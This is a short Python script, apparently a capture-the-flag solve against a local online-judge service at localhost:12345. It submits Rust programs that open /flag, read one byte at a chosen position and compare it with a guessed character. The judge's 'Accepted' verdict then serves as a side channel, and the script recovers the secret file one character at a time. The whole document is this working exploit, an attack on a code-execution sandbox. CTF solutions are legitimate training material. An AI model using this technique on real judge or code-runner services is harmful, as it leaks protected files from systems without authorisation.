import requests


session = requests.Session()
url = "http://localhost:12345/jobs"


flag = ""

payload = """
use std::fs::File;
use std::io::{Read, Seek, SeekFrom};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::open("/flag")?;
    let position = %POSITION%;
    file.seek(SeekFrom::Start(position as u64))?;
    let mut char_buffer = [0u8; 1];
    file.read_exact(&mut char_buffer)?;
    let character = char_buffer[0] as char;
    
    if character == '%GUESS%' {
        print!("Hello World!");
        Ok(())
    } else {
        Err("Hack for fun".into())
    }
}
"""

for pos in range(42):
    for guess in '0123456789abcdefgl-{}':
        data = {
            "language": "Rust",
            "problem_id": 0,
            "source_code": payload.replace("%POSITION%", str(pos)).replace("%GUESS%", guess),
        }
        resp = session.post(url=url, json=data)
        resp_json = resp.json()

        if resp_json["result"] == "Accepted":
            flag += guess
            print(flag)
            break
